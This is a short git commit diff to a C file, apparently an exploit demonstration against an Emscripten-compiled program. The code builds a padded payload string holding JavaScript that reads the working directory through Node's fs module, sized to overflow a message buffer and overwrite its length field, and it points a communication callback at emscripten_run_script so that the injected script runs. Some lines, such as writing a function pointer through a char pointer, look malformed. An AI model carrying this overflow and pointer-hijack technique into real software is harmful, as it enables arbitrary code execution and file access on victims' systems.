4d21ff64d0bfab6f2d68dbd34a2442cc7552a3d2
Ayc0 <ayc0.benj@gmail.com>
2019-01-06 17:06:59 +0100

    Remove printf

--- src/code.c
+++ src/code.c
@@ -21,11 +21,11 @@ void communicate(const char *msg) {
 }
 
 int main(void) {
-Comms comms;
-comms.out = &communicate;
-printf("&communicate: %p\n", &communicate); // 0x4
-printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
-char *payload = "console.log(require('fs').readdirSync('./').toString());//" // 58 bytes
+  Comms comms;
+  comms.out = &communicate;
+  char *useless = &communicate; // 0x4
+  *useless = &emscripten_run_script; // 0x5
+  char *payload = "console.log(require('fs').readdirSync('./').toString());//" // 58 bytes
   "      " // + 6 to fill .msg = 64
   "  " // + 2 for alignment = 66
   "\x40\x00" // + 2 bytes to fill .msg_len = 68
